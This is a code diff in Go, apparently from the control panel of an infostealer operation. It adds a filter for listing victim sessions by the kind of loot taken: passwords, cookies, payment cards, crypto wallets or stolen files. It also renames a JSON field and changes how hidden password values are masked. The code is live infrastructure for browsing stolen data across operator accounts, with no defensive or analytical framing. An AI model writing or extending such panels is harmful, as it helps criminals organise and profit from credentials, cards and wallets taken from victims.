@@ -116,6 +116,20 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 	if unviewedOnly {
 		conditions = append(conditions, "(s.viewed IS NULL OR s.viewed = 0)")
 	}
+	if typ := r.URL.Query().Get("type"); typ != "" {
+		switch typ {
+		case "password":
+			conditions = append(conditions, "EXISTS (SELECT 1 FROM passwords p WHERE p.session_id = s.id)")
+		case "cookie":
+			conditions = append(conditions, "EXISTS (SELECT 1 FROM cookies c WHERE c.session_id = s.id)")
+		case "card":
+			conditions = append(conditions, "EXISTS (SELECT 1 FROM cards c WHERE c.session_id = s.id)")
+		case "wallet":
+			conditions = append(conditions, "EXISTS (SELECT 1 FROM wallets w WHERE w.session_id = s.id)")
+		case "file":
+			conditions = append(conditions, "EXISTS (SELECT 1 FROM stolen_files f WHERE f.session_id = s.id)")
+		}
+	}
 
 	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
 		conditions = append(conditions, "s.owner_id = ?")
@@ -205,7 +219,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 	pages := (total + limit - 1) / limit
 
 	writeJSON(w, http.StatusOK, map[string]any{
-		"items": items,
+		"sessions": items,
 		"total": total,
 		"page":  page,
 		"limit": limit,
@@ -259,7 +273,7 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 	passwords := queryPasswords(h.db, id)
 	if !reveal {
 		for i := range passwords {
-			passwords[i].PasswordValue = "***HIDDEN***"
+			passwords[i].PasswordValue = ""
 		}
 	}
 	cookies := queryCookies(h.db, id)
